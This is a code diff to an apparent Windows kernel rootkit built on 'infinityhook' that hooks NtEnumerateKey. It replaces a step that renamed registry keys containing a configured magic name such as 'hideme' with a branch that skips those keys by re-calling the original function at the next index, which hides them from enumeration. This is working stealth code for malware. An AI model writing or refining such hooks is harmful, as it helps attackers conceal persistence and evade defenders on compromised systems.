@@ -52,11 +52,6 @@ NTSTATUS DetourNtEnumerateKey(
 			}
 			kprintf("[+] infinityhook: NtEnumerateKey: NameLength: %d, Name: %ws\n", KeyBasicInformationPtr->NameLength, NameBuffer);
 			
-			// if the key contains 'hideme', change it to 'xideme'
-			if (wcsstr(NameBuffer, Settings.RegistryKeyMagicName)) {
-				KeyBasicInformationPtr->Name[0] = L'x';
-			}
-
 			// try to get info about the handle
 			// TODO - dynamic allocation
 			PVOID KeyInformationBuffer[100] = { 0 };
@@ -74,6 +69,17 @@ NTSTATUS DetourNtEnumerateKey(
 			else {
 				kprintf("[-] infinityhook: ZwQueryKey not success: %x\n", KeyResult);
 			}
+
+			// if the key contains 'hideme', change it to 'xideme'
+			/*if (wcsstr(NameBuffer, Settings.RegistryKeyMagicName)) {
+				KeyBasicInformationPtr->Name[0] = L'x';
+			}*/
+			
+			// if the key contains 'hideme', return ANOTHER CALL of NtEnumerateKey
+			if (wcsstr(NameBuffer, Settings.RegistryKeyMagicName)) {
+				return OriginalNtEnumerateKey(KeyHandle, Index + 1, KeyInformationClass, KeyInformation, Length, ResultLength);
+			}
+
 		}
 		return status;
 	}
